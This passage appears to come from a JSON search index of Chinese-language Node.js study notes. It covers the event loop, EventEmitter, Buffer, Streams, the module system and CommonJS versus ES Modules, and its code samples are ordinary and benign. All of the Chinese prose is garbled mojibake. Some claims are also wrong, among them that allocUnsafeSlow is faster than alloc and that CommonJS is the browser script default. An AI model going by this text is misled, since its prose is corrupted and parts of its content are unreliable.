è°ƒç”¨ï¼›\n  pollï¼šè½®è¯¢é˜¶æ®µï¼Œæ£€æµ‹æ–°çš„ I/O äº‹ä»¶ï¼Œæ‰§è¡Œä¸ I/O ç›¸å…³çš„å›è°ƒï¼ˆå‡ ä¹æ‰€æœ‰çš„å›è°ƒéƒ½æ˜¯å…³é—­å›è°ƒï¼Œå®šæ—¶å™¨è°ƒåº¦çš„å›è°ƒï¼Œä»¥åŠ setImmaditate()ï¼‰ï¼Œnodeä¼šåœ¨æ­¤é˜¶æ®µé€‚å½“çš„é˜»å¡\n  checkï¼šæ­¤é˜¶æ®µè°ƒç”¨ setImmadiate() è®¾ç½®çš„å›è°ƒ\n  close callbacksï¼šä¸€äº›å…³é—­å›è°ƒï¼Œæ¯”å¦‚è¯´ socket.on('close',...)\n  åœ¨æ¯ä¸ªé˜Ÿåˆ—é˜¶æ®µå¤„ç†å®Œä¹‹åï¼Œå¹¶ä¸æ˜¯ç›´æ¥è¿›å…¥ä¸‹ä¸€é˜¶æ®µï¼Œè€Œæ˜¯ä¼šå¤„ç†ä¸€äº›ä¸­é—´é˜Ÿåˆ—ï¼š\n æœ‰ 4 ä¸ªä¸»è¦ç±»å‹çš„é˜Ÿåˆ—ï¼Œè¢«åŸç”Ÿçš„ libuv äº‹ä»¶å¾ªç¯å¤„ç†ã€‚  è¿‡æœŸè®¡æ—¶å™¨å’Œé—´éš”é˜Ÿåˆ—ï¼ˆExpired timers and intervals Queueï¼‰ï¼šå®é™…æ˜¯æœ€å°å †å­˜å‚¨ï¼› IO äº‹ä»¶é˜Ÿåˆ—ï¼ˆIO Events Queueï¼‰ï¼šå®Œæˆçš„ I/O äº‹ä»¶ï¼› ç«‹å³æ‰§è¡Œçš„é˜Ÿåˆ—ï¼ˆImmediate Queueï¼‰ï¼šä½¿ç”¨ setImmediate å‡½æ•°æ·»åŠ çš„å›è°ƒï¼› å…³é—­æ“ä½œé˜Ÿåˆ—ï¼ˆClose Handlers Queueï¼‰ï¼šä»»ä½•ä¸€ä¸ª close äº‹ä»¶å¤„ç†å™¨ã€‚   é™¤äº†å››ä¸ªä¸»è¦çš„é˜Ÿåˆ—ï¼Œè¿™é‡Œå¦å¤–æœ‰ä¸¤ä¸ªè¢« Node ä¸Šå±‚å¤„ç†çš„é˜Ÿåˆ—ï¼š  ä¸‹ä¸€ä¸ªè¿è½¬é˜Ÿåˆ—ï¼ˆNext Ticks Queueï¼‰ï¼šä½¿ç”¨ process.nextTick() å‡½æ•°æ·»åŠ çš„å›è°ƒ å…¶ä»–çš„å¾®é˜Ÿåˆ—ï¼ˆother Microtasks Queueï¼‰ï¼šåŒ…å«å…¶ä»–çš„å¾®é˜Ÿåˆ—å¦‚æˆåŠŸçš„ Promise å›è°ƒ    äº‹ä»¶å¾ªç¯ç»™äº† nodejs è¿™äº›ç‰¹æ€§ï¼š\n  Node.js å‡ ä¹æ¯ä¸€ä¸ª API éƒ½æ˜¯æ”¯æŒå›è°ƒå‡½æ•°çš„ã€‚\n  è¿™äº›æ¥å£å¯ä»¥å¤„ç†å¤§é‡çš„å¹¶å‘ï¼Œæ‰€ä»¥æ€§èƒ½éå¸¸é«˜ã€‚\n  Node.js åŸºæœ¬ä¸Šæ‰€æœ‰çš„äº‹ä»¶æœºåˆ¶éƒ½æ˜¯ç”¨è®¾è®¡æ¨¡å¼ä¸­è§‚å¯Ÿè€…æ¨¡å¼å®ç°ã€‚\n  äº‹ä»¶é©±åŠ¨ç¨‹åº #  Node.js ä½¿ç”¨äº‹ä»¶é©±åŠ¨æ¨¡å‹ï¼Œå½“ web server æ¥æ”¶åˆ°è¯·æ±‚ï¼Œå°±æŠŠå®ƒå…³é—­ç„¶åè¿›è¡Œå¤„ç†ï¼Œç„¶åå»æœåŠ¡ä¸‹ä¸€ä¸ª web è¯·æ±‚ã€‚å½“è¿™ä¸ªè¯·æ±‚å®Œæˆï¼Œå®ƒè¢«æ”¾å›å¤„ç†é˜Ÿåˆ—ï¼Œå½“åˆ°è¾¾é˜Ÿåˆ—å¼€å¤´ï¼Œè¿™ä¸ªç»“æœè¢«è¿”å›ç»™ç”¨æˆ·ã€‚\nè¿™ä¸ªæ¨¡å‹éå¸¸é«˜æ•ˆå¯æ‰©å±•æ€§éå¸¸å¼ºï¼Œå› ä¸º webserver ä¸€ç›´æ¥å—è¯·æ±‚è€Œä¸ç­‰å¾…ä»»ä½•è¯»å†™æ“ä½œã€‚ï¼ˆè¿™ä¹Ÿç§°ä¹‹ä¸ºéé˜»å¡å¼ IO æˆ–è€…äº‹ä»¶é©±åŠ¨ IOï¼‰\nåœ¨äº‹ä»¶é©±åŠ¨æ¨¡å‹ä¸­ï¼Œä¼šç”Ÿæˆä¸€ä¸ªä¸»å¾ªç¯æ¥ç›‘å¬äº‹ä»¶ï¼Œå½“æ£€æµ‹åˆ°äº‹ä»¶æ—¶è§¦å‘å›è°ƒå‡½æ•°ã€‚\næ•´ä¸ªäº‹ä»¶é©±åŠ¨çš„æµç¨‹å°±æ˜¯è¿™ä¹ˆå®ç°çš„ï¼Œéå¸¸ç®€æ´ã€‚æœ‰ç‚¹ç±»ä¼¼äºè§‚å¯Ÿè€…æ¨¡å¼ï¼Œäº‹ä»¶ç›¸å½“äºä¸€ä¸ªä¸»é¢˜ (Subject)ï¼Œè€Œæ‰€æœ‰æ³¨å†Œåˆ°è¿™ä¸ªäº‹ä»¶ä¸Šçš„å¤„ç†å‡½æ•°ç›¸å½“äºè§‚å¯Ÿè€… (Observer)ã€‚\nNode.js æœ‰å¤šä¸ªå†…ç½®çš„äº‹ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¼•å…¥ events æ¨¡å—ï¼Œå¹¶é€šè¿‡å®ä¾‹åŒ– EventEmitter ç±»æ¥ç»‘å®šå’Œç›‘å¬äº‹ä»¶ï¼Œå¦‚ä¸‹å®ä¾‹ï¼š\n// å¼•å…¥ events æ¨¡å— var events = require(\u0026#39;events\u0026#39;); // åˆ›å»º eventEmitter å¯¹è±¡ var eventEmitter = new events.EventEmitter(); ä»¥ä¸‹ç¨‹åºç»‘å®šäº‹ä»¶å¤„ç†ç¨‹åºï¼š\n// ç»‘å®šäº‹ä»¶åŠäº‹ä»¶çš„å¤„ç†ç¨‹åº eventEmitter.on(\u0026#39;eventName\u0026#39;, eventHandler); æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¨‹åºè§¦å‘äº‹ä»¶ï¼š\n// è§¦å‘äº‹ä»¶ eventEmitter.emit(\u0026#39;eventName\u0026#39;); "},{"id":82,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/6.eventemitter/","title":"6. Event Emitter","section":"nodejs","content":" å‚è€ƒï¼š\n https://www.runoob.com/nodejs/nodejs-event.html   EventEmitter #  Node.js æ‰€æœ‰çš„å¼‚æ­¥ I/O æ“ä½œåœ¨å®Œæˆæ—¶éƒ½ä¼šå‘é€ä¸€ä¸ªäº‹ä»¶åˆ°äº‹ä»¶é˜Ÿåˆ—ã€‚\nNode.js é‡Œé¢çš„è®¸å¤šå¯¹è±¡éƒ½ä¼šåˆ†å‘äº‹ä»¶ï¼šä¸€ä¸ª net.Server å¯¹è±¡ä¼šåœ¨æ¯æ¬¡æœ‰æ–°è¿æ¥æ—¶è§¦å‘ä¸€ä¸ªäº‹ä»¶ï¼Œ ä¸€ä¸ª fs.readStream å¯¹è±¡ä¼šåœ¨æ–‡ä»¶è¢«æ‰“å¼€çš„æ—¶å€™è§¦å‘ä¸€ä¸ªäº‹ä»¶ã€‚\næ‰€æœ‰è¿™äº›äº§ç”Ÿäº‹ä»¶çš„å¯¹è±¡éƒ½æ˜¯ events.EventEmitter çš„å®ä¾‹ã€‚\nå®ƒè¢«å®šä¹‰åœ¨ eventsï¼Œè¿™ä¸ªæ¨¡å—ä¸­ï¼š\nvar events = require(\u0026#39;events\u0026#39;); è¿™ä¸ªæ¨¡å—åªå®šä¹‰äº†ä¸€ä¸ªå¯¹è±¡ events.EventEmitterï¼Œå®ƒçš„æ ¸å¿ƒå°±æ˜¯äº‹ä»¶è§¦å‘ä¸äº‹ä»¶ç›‘å¬å™¨åŠŸèƒ½çš„å°è£…ï¼š\nvar eventEmitter = new events.EventEmitter(); ä¸‹é¢ä¸€ä¸ªç®€å•çš„ä¾‹å­é˜è¿°äº‹ä»¶çš„ç›‘å¬å’Œå‡ºå‘è¿‡ç¨‹ï¼š\n//event.js æ–‡ä»¶ var events = require(\u0026#39;events\u0026#39;); var emitter = new events.EventEmitter(); emitter.on(\u0026#39;someEvent\u0026#39;, function(arg1, arg2) {  console.log(\u0026#39;listener1\u0026#39;, arg1, arg2); }); emitter.on(\u0026#39;someEvent\u0026#39;, function(arg1, arg2) {  console.log(\u0026#39;listener2\u0026#39;, arg1, arg2); }); emitter.emit(\u0026#39;someEvent\u0026#39;, \u0026#39;strArg1\u0026#39;, \u0026#39;strArg2\u0026#39;); $ node events.js listener1 strArg1 strArg2 listener2 strArg1 strArg2 æœ‰å…³è¿™ä¸ªåº“æ›´è¯¦ç»†çš„æ¥å£ï¼Œå¯ä»¥å‚è€ƒå®˜æ–¹æ–‡æ¡£\n"},{"id":83,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/7.buffer/","title":"7. Buffer","section":"nodejs","content":" å‚è€ƒï¼š\n https://www.runoob.com/nodejs/nodejs-buffer.html   Buffer #  æ¦‚è¿° #  JavaScript è¯­è¨€è‡ªèº«åªæœ‰å­—ç¬¦ä¸²æ•°æ®ç±»å‹ï¼Œæ²¡æœ‰äºŒè¿›åˆ¶æ•°æ®ç±»å‹ã€‚å› æ­¤åœ¨ Node.js ä¸­ï¼Œå®šä¹‰äº†ä¸€ä¸ª Buffer ç±»ï¼Œè¯¥ç±»ç”¨æ¥åˆ›å»ºä¸€ä¸ªä¸“é—¨å­˜æ”¾äºŒè¿›åˆ¶æ•°æ®çš„ç¼“å­˜åŒºã€‚ä¸€ä¸ª Buffer ç±»ä¼¼äºä¸€ä¸ªæ•´æ•°æ•°ç»„ï¼Œä½†å®ƒå¯¹åº”äº V8 å †å†…å­˜ä¹‹å¤–çš„ä¸€å—åŸå§‹å†…å­˜ã€‚\nä¸‹é¢ä»‹ç»ä¸€äº›å¸¸è§çš„ç”¨æ³•ã€‚å®Œæ•´çš„è¯·å‚è€ƒå®˜æ–¹æ–‡æ¡£ã€‚\nç¼–ç ä¸è§£ç  #  å°†å­—ç¬¦ä¸²è½¬åŒ–ä¸ºäºŒè¿›åˆ¶æ•°æ®çš„è¿‡ç¨‹å«ç¼–ç ï¼š\nconst buf = Buffer.from(\u0026#39;runoob\u0026#39;, \u0026#39;ascii\u0026#39;); å°†äºŒè¿›åˆ¶æ•°æ®è½¬åŒ–ä¸ºå­—ç¬¦ä¸²çš„è¿‡ç¨‹å«è§£ç ï¼š\nconsole.log(buf.toString(\u0026#39;hex\u0026#39;));\t// è¾“å‡º 72756e6f6f62 Node.js ç›®å‰æ”¯æŒçš„å­—ç¬¦ç¼–ç åŒ…æ‹¬ï¼š\n asciiï¼šä»…æ”¯æŒ 7 ä½ ASCII æ•°æ®ã€‚å¦‚æœè®¾ç½®å»æ‰é«˜ä½çš„è¯ï¼Œè¿™ç§ç¼–ç æ˜¯éå¸¸å¿«çš„ã€‚ utf8ï¼šå¤šå­—èŠ‚ç¼–ç çš„ Unicode å­—ç¬¦ã€‚è®¸å¤šç½‘é¡µå’Œå…¶ä»–æ–‡æ¡£æ ¼å¼éƒ½ä½¿ç”¨ UTF-8 ã€‚ utf16le/ucs2ï¼š2 æˆ– 4 ä¸ªå­—èŠ‚ï¼Œå°å­—èŠ‚åºç¼–ç çš„ Unicode å­—ç¬¦ã€‚æ”¯æŒä»£ç†å¯¹ï¼ˆU+10000 è‡³ U+10FFFFï¼‰ã€‚ base64ï¼šBase64 ç¼–ç ã€‚ latin1/binaryï¼šä¸€ç§æŠŠ Buffer ç¼–ç æˆä¸€å­—èŠ‚ç¼–ç çš„å­—ç¬¦ä¸²çš„æ–¹å¼ã€‚ hexï¼šå°†æ¯ä¸ªå­—èŠ‚ç¼–ç ä¸ºä¸¤ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ã€‚  åˆ›å»º Buffer ç±» #  Buffer æä¾›äº†ä»¥ä¸‹ API æ¥åˆ›å»º Buffer ç±»ï¼š\nBuffer.alloc(size[, fill[, encoding]]); // è¿”å›ä¸€ä¸ªæŒ‡å®šå¤§å°çš„ Buffer å®ä¾‹ï¼Œå¦‚æœæ²¡æœ‰è®¾ç½® fillï¼Œåˆ™é»˜è®¤å¡«æ»¡ 0  Buffer.allocUnsafe(size); // è¿”å›ä¸€ä¸ªæŒ‡å®šå¤§å°çš„ Buffer å®ä¾‹ï¼Œä½†æ˜¯å®ƒä¸ä¼šè¢«åˆå§‹åŒ–ï¼Œæ‰€ä»¥å®ƒå¯èƒ½åŒ…å«æ•æ„Ÿçš„æ•°æ®  Buffer.allocUnsafeSlow(size); // è¿™ä¸ªæ–¹æ³•æ¯”è°ƒç”¨ Buffer.alloc() æ›´å¿« // ä½†è¿”å›çš„ Buffer å®ä¾‹å¯èƒ½åŒ…å«æ—§æ•°æ®ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨ fill() æˆ– write() é‡å†™ã€‚  Buffer.from(array); // è¿”å›ä¸€ä¸ªè¢« array çš„å€¼åˆå§‹åŒ–çš„æ–°çš„ Buffer å®ä¾‹ï¼ˆä¼ å…¥çš„ array çš„å…ƒç´ åªèƒ½æ˜¯æ•°å­—ï¼Œä¸ç„¶å°±ä¼šè‡ªåŠ¨è¢« 0 è¦†ç›–ï¼‰  Buffer.from(arrayBuffer[, byteOffset[, length]]); // è¿”å›ä¸€ä¸ªæ–°å»ºçš„ä¸ç»™å®šçš„ ArrayBuffer å…±äº«åŒä¸€å†…å­˜çš„ Bufferã€‚  Buffer.from(buffer); // å¤åˆ¶ä¼ å…¥çš„ Buffer å®ä¾‹çš„æ•°æ®ï¼Œå¹¶è¿”å›ä¸€ä¸ªæ–°çš„ Buffer å®ä¾‹  Buffer.from(string[, encoding]); // è¿”å›ä¸€ä¸ªè¢« string çš„å€¼åˆå§‹åŒ–çš„æ–°çš„ Buffer å®ä¾‹ "},{"id":84,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/8.stream/","title":"8. Stream","section":"nodejs","content":"Stream #  æ¦‚è¿° #  Stream æ˜¯ä¸€ä¸ªæŠ½è±¡æ¥å£ï¼ŒNode ä¸­æœ‰å¾ˆå¤šå¯¹è±¡å®ç°äº†è¿™ä¸ªæ¥å£ã€‚ä¾‹å¦‚ï¼Œå¯¹ http æœåŠ¡å™¨å‘èµ·è¯·æ±‚çš„ request å¯¹è±¡å°±æ˜¯ä¸€ä¸ª Streamï¼Œè¿˜æœ‰ stdoutï¼ˆæ ‡å‡†è¾“å‡ºï¼‰ä¹Ÿæ˜¯ä¸€ä¸ª Streamã€‚\nNode.jsï¼ŒStream æœ‰å››ç§æµç±»å‹ï¼š\n Readableï¼šå¯è¯»æ“ä½œã€‚ Writableï¼šå¯å†™æ“ä½œã€‚ Duplexï¼šå¯è¯»å¯å†™æ“ä½œ. Transformï¼šæ“ä½œè¢«å†™å…¥æ•°æ®ï¼Œç„¶åè¯»å‡ºç»“æœã€‚  æ‰€æœ‰çš„ Stream å¯¹è±¡éƒ½æ˜¯ EventEmitter çš„å®ä¾‹ã€‚å¸¸ç”¨çš„äº‹ä»¶æœ‰ï¼š\n dataï¼šå½“æœ‰æ•°æ®å¯è¯»æ—¶è§¦å‘ã€‚ endï¼šæ²¡æœ‰æ›´å¤šçš„æ•°æ®å¯è¯»æ—¶è§¦å‘ã€‚ errorï¼šåœ¨æ¥æ”¶å’Œå†™å…¥è¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯æ—¶è§¦å‘ã€‚ finishï¼šæ‰€æœ‰æ•°æ®å·²è¢«å†™å…¥åˆ°åº•å±‚ç³»ç»Ÿæ—¶è§¦å‘ã€‚  ä»æµä¸­è¯»å–æ•°æ® #  è¯»å–çš„åŸºæœ¬æ–¹æ³•æ˜¯ï¼šé€šè¿‡ç›‘å¬ data äº‹ä»¶ï¼Œæ•°æ®ä¼šåœ¨å›è°ƒå‡½æ•°çš„å‚æ•°ä¸­å›ä¼ ã€‚\nä¸€ä¸ªç¤ºä¾‹ç¨‹åºå¦‚ä¸‹ï¼š\nvar fs = require(\u0026#34;fs\u0026#34;); var data = \u0026#39;\u0026#39;;  var readerStream = fs.createReadStream(\u0026#39;test.txt\u0026#39;); readerStream.setEncoding(\u0026#39;UTF8\u0026#39;);  // å¤„ç†æµäº‹ä»¶ --\u0026gt; data, end, and error readerStream.on(\u0026#39;data\u0026#39;, chunk =\u0026gt; { data += chunk; }); readerStream.on(\u0026#39;end\u0026#39;, () =\u0026gt; { console.log(data); }); readerStream.on(\u0026#39;error\u0026#39;, err =\u0026gt; { console.log(err.stack); });  console.log(\u0026#34;Done!!\u0026#34;); $ node readstream.js Done!! laji shesl\u0026#39;s test case å‘æµä¸­å†™å…¥æ•°æ® #  å†™å…¥çš„åŸºæœ¬æ–¹æ³•æ˜¯è°ƒç”¨ write æ–¹æ³•ã€‚\nä¸€ä¸ªç¤ºä¾‹ç¨‹åºå¦‚ä¸‹ï¼š\nvar fs = require(\u0026#34;fs\u0026#34;); var data = \u0026#34;laji shesl\u0026#39;s test case\u0026#34;;  var writerStream = fs.createWriteStream(\u0026#39;test.txt\u0026#39;);  // å¤„ç†æµäº‹ä»¶ --\u0026gt; data, end, and error writerStream.on(\u0026#39;finish\u0026#39;, () =\u0026gt; { console.log(\u0026#34;Finish.\u0026#34;); }); writerStream.on(\u0026#39;error\u0026#39;, (err) =\u0026gt; { console.log(err.stack); });  writerStream.write(data,\u0026#39;UTF8\u0026#39;); writerStream.end();  console.log(\u0026#34;Done!!\u0026#34;); $ node writestream.js Done!! Finish. æŸ¥çœ‹å†…å®¹ï¼š\n$ cat test.txt laji shesl\u0026#39;s test case% ç®¡é“æµ #  è¿™é‡Œçš„ç®¡é“ï¼Œä¸ Unix è®¾è®¡æ€æƒ³ä¸­çš„ç®¡é“æ¦‚å¿µæ˜¯ç›¸åŒçš„ã€‚å®ƒå°†è¾“å…¥æµå‘é€ç»™è¾“å‡ºæµã€‚\nç¤ºä¾‹ç¨‹åºå¦‚ä¸‹ï¼š\nvar fs = require(\u0026#34;fs\u0026#34;);  var readerStream = fs.createReadStream(\u0026#39;input.txt\u0026#39;); var writerStream = fs.createWriteStream(\u0026#39;output.txt\u0026#39;);  // ç®¡é“è¯»å†™æ“ä½œ // è¯»å– input.txt æ–‡ä»¶å†…å®¹ï¼Œå¹¶å°†å†…å®¹å†™å…¥åˆ° output.txt æ–‡ä»¶ä¸­ readerStream.pipe(writerStream);  console.log(\u0026#34;Done!!!\u0026#34;); é“¾å¼æµ #  ç®€å•çš„è¯´é“¾å¼æµå°±æ˜¯è¿ç»­è°ƒç”¨ç®¡é“æµï¼Œå°±å¦‚åŒ Unix ä¸­çš„å‘½ä»¤ä¸€æ ·ã€‚å®ƒä¹‹æ‰€ä»¥å¯ä»¥è¿™ä¹ˆåšå°±ç­‰åŒäº C++ ä¸­ \u0026lt;\u0026lt; çš„è¿”å›å€¼åŸç†æ˜¯ä¸€æ ·çš„ã€‚\nä¸‹é¢æ˜¯å‹ç¼©å’Œè§£å‹ç¼©çš„ç¨‹åºçš„ä¾‹å­ï¼š\nvar fs = require(\u0026#34;fs\u0026#34;); var zlib = require(\u0026#39;zlib\u0026#39;);  // å‹ç¼© input.txt æ–‡ä»¶ä¸º input.txt.gz fs.createReadStream(\u0026#39;input.txt\u0026#39;)  .pipe(zlib.createGzip())  .pipe(fs.createWriteStream(\u0026#39;input.txt.gz\u0026#39;));  console.log(\u0026#34;File compose done!!\u0026#34;); var fs = require(\u0026#34;fs\u0026#34;); var zlib = require(\u0026#39;zlib\u0026#39;);  // è§£å‹ input.txt.gz æ–‡ä»¶ä¸º input.txt fs.createReadStream(\u0026#39;input.txt.gz\u0026#39;)  .pipe(zlib.createGunzip())  .pipe(fs.createWriteStream(\u0026#39;input.txt\u0026#39;));  console.log(\u0026#34;File decompose done!!\u0026#34;); "},{"id":85,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/9.%E6%A8%A1%E5%9D%97%E7%B3%BB%E7%BB%9F/","title":"9.æ¨¡å—ç³»ç»Ÿ","section":"nodejs","content":"æ¨¡å—ç³»ç»Ÿ #  æ¦‚è¿° #  ä¸ºäº†è®© Node.js çš„æ–‡ä»¶å¯ä»¥ç›¸äº’è°ƒç”¨ï¼ŒNode.js æä¾›äº†ä¸€ä¸ªç®€å•çš„æ¨¡å—ç³»ç»Ÿã€‚\næ¨¡å—æ˜¯ Node.js åº”ç”¨ç¨‹åºçš„åŸºæœ¬ç»„æˆéƒ¨åˆ†ï¼Œæ–‡ä»¶å’Œæ¨¡å—æ˜¯ä¸€ä¸€å¯¹åº”çš„ã€‚æ¢è¨€ä¹‹ï¼Œä¸€ä¸ª Node.js æ–‡ä»¶å°±æ˜¯ä¸€ä¸ªæ¨¡å—ï¼Œè¿™ä¸ªæ–‡ä»¶å¯èƒ½æ˜¯ JavaScript ä»£ç ã€JSON æˆ–è€…ç¼–è¯‘è¿‡çš„C/C++ æ‰©å±•ã€‚\nåˆ›å»ºæ¨¡å— #  åˆ›å»ºä¸€ä¸ªæ¨¡å—éå¸¸ç®€å•ï¼Œä¸¾ä¸ªä¾‹å­ã€‚\nåˆ›å»ºä¸€ä¸ªå« hello çš„æ¨¡å—ï¼Œåªéœ€è¦åˆ›å»º hello.js æ–‡ä»¶ï¼Œä»£ç å¦‚ä¸‹ï¼š\nexports.world = () =\u0026gt; { console.log(\u0026#39;Hello World\u0026#39;); } è¿™æ ·ï¼Œå…¶ä»–æ–‡ä»¶åŒ…å«è¿™ä¸ªæ–‡ä»¶æ—¶ï¼Œå°±å¯ä»¥è®¿é—®åˆ° world è¿™ä¸ªå‡½æ•°äº†ã€‚\nå¦‚æœæˆ‘ä»¬å¸Œæœ›ç›´æ¥å°è£…ä¸€ä¸ªå¯¹è±¡ï¼Œå¯ä»¥ç›´æ¥ç»™ module.exports è¿™ä¸ªå˜é‡èµ‹å€¼ã€‚æ¯”å¦‚ï¼š\nfunction Hello() {  var name;  this.setName = thyName =\u0026gt; { name = thyName; }; };  module.exports = Hello; js æ¨¡å—çš„ç¼–è¯‘åœ¨ç¼–è¯‘çš„è¿‡ç¨‹ä¸­ï¼ŒNode å¯¹è·å–çš„ javascript æ–‡ä»¶å†…å®¹è¿›è¡Œäº†å¤´å°¾åŒ…è£…ï¼Œå°†æ–‡ä»¶å†…å®¹åŒ…è£…åœ¨ä¸€ä¸ª function ä¸­ï¼š\n(function (exports, require, module, __filename, __dirname) { \t//...  return module.exports; }) æ–‡ä»¶æ¨¡å—ä¸åŸç”Ÿæ¨¡å— #  æ ¸å¿ƒï¼ˆåŸç”Ÿï¼‰æ¨¡å—æ˜¯æŒ‡é‚£äº›éš Node.js å®‰è£…è€Œå®‰è£…çš„æ¨¡å—ï¼Œè¿™äº›æ¨¡å—åœ¨ Node.js æºä»£ç ç¼–è¯‘æ—¶è¢«ç¼–è¯‘æˆäºŒè¿›åˆ¶æ‰§è¡Œæ–‡ä»¶ã€‚ç›¸æ¯”æ–‡ä»¶æ¨¡å—ï¼Œæ ¸å¿ƒï¼ˆåŸç”Ÿï¼‰æ¨¡å—çš„åŠ è½½é€Ÿåº¦æ›´å¿«ã€‚\nå¯ä»¥å‚è€ƒï¼Œå…¶ä»–äººæ•´ç†çš„åŸç”Ÿæ¨¡å—åˆ—è¡¨ã€‚\næ–‡ä»¶æ¨¡å—çš„æ–‡ä»¶åæœ‰ä¸‰ç§è¡¨ç¤ºæ–¹å¼ï¼š/ ç»å¯¹è·¯å¾„ã€./ è°ƒç”¨ require å‡½æ•°æ–‡ä»¶çš„ä½ç½®ã€ç›´æ¥ä½¿ç”¨æ¨¡å—åä¼šå¯»æ‰¾ node_module ä¸æ ¸å¿ƒæ¨¡å—ã€‚\næŸ¥æ‰¾çš„ä¼˜å…ˆçº§é¡ºåºå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š\n"},{"id":86,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/javascript/nodejs/nodemodules/","title":"Node Modules","section":"nodejs","content":" å‚è€ƒï¼š\n https://www.zhihu.com/question/62791509 https://redfin.engineering/node-modules-at-war-why-commonjs-and-es-modules-cant-get-along-9617135eeca1   Commonjs vs ES Modules #  Whatâ€™s CJS? Whatâ€™s ESM? #  åœ¨ Node æ¨¡å—çš„æ—©æœŸï¼Œæ‰€æœ‰çš„ Node Module éƒ½æ˜¯ç”¨ Common.js ç¼–å†™çš„ã€‚æˆ‘ä»¬å¯ä»¥ä» named export ä¸ default export ä¸¤ç§æ–¹å¼ç®€å•åœ°äº†è§£å®ƒçš„ä½¿ç”¨è§„åˆ™ï¼š\n named exportï¼š  // @filename: util.cjs module.exports.sum = (x, y) =\u0026gt; x + y;  // @filename: main.cjs const {sum} = require(\u0026#39;./util.cjs\u0026#39;); default exportï¼š  // @filename: util.cjs module.exports = (x, y) =\u0026gt; x + y;  // @filename: main.cjs const whateverWeWant = require(\u0026#39;./util.cjs\u0026#39;); console.log(whateverWeWant(2, 4)); åœ¨ ES Module ä¸­ï¼Œimport å’Œ export å…³é”®å­—åˆ™æ˜¯è¯­è¨€çš„ä¸€éƒ¨åˆ†ï¼š\n named exportï¼š  // @filename: util.mjs export const sum = (x, y) =\u0026gt; x + y;  // @filename: main.mjs import {sum} from \u0026#39;./util.mjs\u0026#39; console.log(sum(2, 4)); default exportï¼š  // @filename: util.mjs export default (x, y) =\u0026gt; x + y;  // @filename: main.mjs import whateverWeWant from \u0026#39;./util.mjs\u0026#39; console.log(whateverWeWant(2, 4)); Loader Machanism #  common.js çš„åŠ è½½æœºåˆ¶ç›¸å½“ç®€å•ï¼š\n common.js ä¸­çš„å…³é”®è¯ require æ˜¯åŒæ­¥çš„ï¼Œå®ƒå¹¶ä¸ä¼šè¿”å›ä¸€ä¸ª Promise å¯¹è±¡æˆ–ä½¿ç”¨ callback ä½œä¸ºå‚æ•°ã€‚å®ƒç®€å•åœ°ä»ç£ç›˜æˆ–ç½‘ç»œä¸­è·å–å¯¹åº”çš„ js è„šæœ¬ï¼Œç„¶åç›´æ¥è¿è¡Œè¿™ä¸ªè„šæœ¬ï¼Œè¿”å›è®¾ç½®åœ¨ module.exports ä¸Šçš„å˜é‡ï¼›  ES Module çš„åŠ è½½æœºåˆ¶åˆ™å¯ä»¥åˆ†ä¸ºä¸‰ä¸ªæ­¥éª¤ï¼š\n åŠ è½½å™¨ç®€å•åœ°åˆ†æ import å’Œ export è¯­å¥åˆ†ææ¯ä¸ªæ–‡ä»¶çš„å¼•ç”¨å’Œå¯¼å‡ºå…³ç³»ï¼› æ‰€æœ‰çš„æ— ä¾èµ–å…³ç³»çš„å§Šå¦¹æ–‡ä»¶åŒæ­¥åœ°ä»ç£ç›˜æˆ–ç½‘ç»œåŠ è½½ï¼› é€šè¿‡ç¬¬ä¸€æ­¥ä¸­åˆ†æå¾—åˆ°çš„å…³ç³»ï¼Œæ„å»ºå‡ºä¸€ä¸ªä¾èµ–å…³ç³»å›¾ï¼Œå¹¶ä¸”è‡ªåº•å‘ä¸Šåœ°æ‰§è¡Œï¼Œç›´åˆ°è¿™ä¸ªæ‰¾åˆ°è¿™ä¸ªå›¾ä¸­çš„ä¸€ä¸ªèŠ‚ç‚¹å¹¶æ²¡æœ‰å¯¹å…¶ä»–ä»»ä½•æ¨¡å—æœ‰å¼•ç”¨å…³ç³»ï¼›  Inter-Invocation #  common.js é€šå¸¸æ˜¯æ¨¡å—ï¼ˆæ¯”å¦‚æµè§ˆå™¨çš„ \u0026lt;script\u0026gt; æ ‡ç­¾ï¼‰çš„é»˜è®¤ç­–ç•¥ï¼šå› ä¸º ES Module ç›¸å¯¹äº common.js æ”¹å˜äº†è®¸å¤šç­–ç•¥ã€‚\nå°†æ¨¡å—ä» ES Module è¿ç§»åˆ° common.js å°†ä¼šå¯¹å…¼å®¹æ€§é€ æˆå¾ˆå¤§æŸå®³ï¼ˆDeno å°±æ˜¯ä¸€ä¸ªå®Œå…¨ä½¿ç”¨ ES Module çš„ JavaScript è¿è¡Œæ—¶ï¼Œä¸ä¹‹ç›¸åº”çš„ï¼Œå®ƒçš„ç”Ÿæ€ä¹Ÿéœ€è¦ä»å¤´å¼€å§‹å»ºç«‹ï¼‰ã€‚\nCJS can\u0026rsquo;t requre ESM #  å› ä¸º ESM æ”¯æŒé¡¶çº§ await è¯­å¥ï¼ˆå³åœ¨ä»»ä½•ä¸€ä¸ª async å‡½æ•°ä¹‹å¤–ä½¿ç”¨ await è¯­å¥ï¼Œè¿™æ˜¯å› ä¸ºä¹‹å‰æåŠçš„ ES Module ä½¿ç”¨å¤šé˜¶æ®µåŠ è½½æœºåˆ¶ï¼‰ï¼Œä½†æ˜¯ CJS ä¸æ”¯æŒã€‚\nRich Harris åœ¨è¿™ç¯‡æ–‡ç« ä¸­æå‡ºäº†ä¸€ç³»åˆ—çš„åŸå› ä»¥è¡¨è¾¾ä¸æ”¯æŒ JavaScript 